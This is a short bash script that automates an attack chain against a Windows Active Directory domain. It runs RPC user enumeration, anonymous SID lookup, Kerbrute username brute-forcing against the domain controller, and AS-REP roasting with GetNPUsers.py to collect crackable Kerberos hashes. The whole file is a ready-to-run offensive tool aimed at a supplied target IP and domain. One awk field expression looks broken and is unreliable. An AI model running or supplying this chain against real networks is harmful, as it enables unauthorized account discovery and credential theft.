#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
ENDCOLOR="\e[0m"

if [ -z $1 ] || [ -z $2 ]
then
    echo -e "${RED}[*] Syntax: <IP> <DOMAIN>${ENDCOLOR}"
    exit 1
fi

echo -e "${GREEN}TARGET IP: $1 ${ENDCOLOR}"
echo -e "${GREEN}TARGET DOMAIN: $2 ${ENDCOLOR}"


echo -e "\n${YELLOW}[+] RPC${ENDCOLOR}\n"
bash rpcenum -e DUsers -i $1 | tee users.txt
bash rpcenum -e All -i $1


echo -e "\n${YELLOW}[+] LookUPSID${ENDCOLOR}\n"

python3 lookupsid.py anonymous@$1 -no-pass 2>/dev/null | tee users1.txt

cat users1.txt | grep SidTypeUser | cut -f2 -d '\' | cut -f1 -d '(' >> users.txt

rm users1.txt

echo -e "\n${YELLOW}[+] KERBRUTE${ENDCOLOR}\n"

./kerbrute userenum --dc $1 -d $2 'usernames.txt' -t 100 | tee pene

a=$(cat pene | wc -l)

sed -n 13,$a'p' pene | awk '{print $(NF  1), $NF}' | cut -f1 -d"@" | grep -v "seconds" | sed -e 's/^.//' >> users.txt

rm pene

echo -e "\n${YELLOW}[+] ASREPRoast${ENDCOLOR}\n"

python3 GetNPUsers.py $2/ -no-pass -usersfile users.txt
